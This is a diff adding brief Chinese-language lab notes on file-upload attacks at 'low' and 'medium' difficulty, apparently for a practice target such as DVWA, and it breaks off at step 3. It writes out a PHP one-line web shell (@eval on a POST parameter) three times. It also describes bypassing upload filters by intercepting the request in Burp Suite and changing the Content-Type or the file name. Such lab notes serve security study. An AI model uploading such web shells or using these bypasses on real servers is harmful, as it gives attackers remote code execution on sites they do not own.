@@ -1,0 +1,17 @@
+low:
+vim  1.php
+<?php
+@eval($_POST['yy']);
+?>
+medium:由源码可知，只能上传图片类型的。
+1.   vim 2.php
+<?php
+@eval($_POST['yy']);
+?>
+burpsuite作代理，抓包修改数据类型：content-type: imge/png
+2.vim  2.php
+<?php
+@eval($_POST['yy']);
+?>
+burpsuite作代理，抓包修改上传文件的后缀名:filename="2.php"  
+3.
